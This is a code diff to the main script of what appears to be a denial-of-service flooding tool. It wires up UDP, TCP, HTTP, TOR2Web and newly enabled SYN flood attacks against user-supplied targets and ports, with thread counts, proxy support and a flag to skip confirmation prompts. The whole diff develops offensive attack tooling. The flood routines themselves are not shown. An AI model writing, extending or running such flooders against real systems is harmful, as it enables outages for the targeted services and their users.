@@ -12,7 +12,13 @@ import ipaddress
 import shutil
 import signal
 from assets.utilities import Style, UI, AttackModule, validate_target
-from assets.methods import UDPFlooder
+from assets.methods import (
+    UDPFlooder,
+    TCPFlooder,
+    HTTPFlooder,
+    TOR2WebFlooder,
+    SYNFlooder  # Add this import
+)
 
 # Target handling and validation
 class TargetManager:
@@ -130,15 +136,21 @@ def get_default_ports(method: str) -> List[int]:
 
 def signal_handler(signum, frame):
     """Handle Ctrl+C interrupt"""
-    if 'active_flooder' in globals():
+    global active_flooder
+    if active_flooder:
+        UI.print_warning("\nStopping operation gracefully...")
         active_flooder.stop()
-    sys.exit(0)
+        active_flooder = None  # Clear the reference
+    sys.exit(1)  # Force exit after stopping
 
 def main():
-    # Setup signal handler for Ctrl+C and make flooder global
-    signal.signal(signal.SIGINT, signal_handler)
+    # Add force_exit flag
     global active_flooder
     active_flooder = None
+
+    # Setup signal handlers for both SIGINT (Ctrl+C) and SIGTERM
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
     
     # Check for color support
     if 'NO_COLOR' in os.environ or not sys.stdout.isatty():
@@ -380,7 +392,6 @@ Supports multiple flooding methods including UDP, SYN, and HTTP attacks.
             )
             active_flooder.start()
         elif args.command == 'tcp':
-            from assets.methods import TCPFlooder
             active_flooder = TCPFlooder(
                 targets=targets,
                 ports=ports,
@@ -392,10 +403,16 @@ Supports multiple flooding methods including UDP, SYN, and HTTP attacks.
             )
             active_flooder.start()
         elif args.command == 'syn':
-            UI.print_warning("SYN flood module not yet implemented")
-            sys.exit(1)
+            active_flooder = SYNFlooder(
+                targets=targets,
+                ports=ports,
+                duration=args.duration,
+                threads=args.threads,
+                proxy_manager=proxy_manager,
+                skip_prompt=args.yes
+            )
+            active_flooder.start()
         elif args.command == 'http':
-            from assets.methods import HTTPFlooder
             active_flooder = HTTPFlooder(
                 targets=targets,
                 ports=ports,
@@ -409,8 +426,6 @@ Supports multiple flooding methods including UDP, SYN, and HTTP attacks.
             active_flooder.start()
         elif args.command == 'tor2web':
             # Import needed for TOR2WEB flood
-            from assets.methods import TOR2WebFlooder
-            
             active_flooder = TOR2WebFlooder(
                 targets=targets,
                 ports=[80],  # TOR2WEB uses HTTP/HTTPS
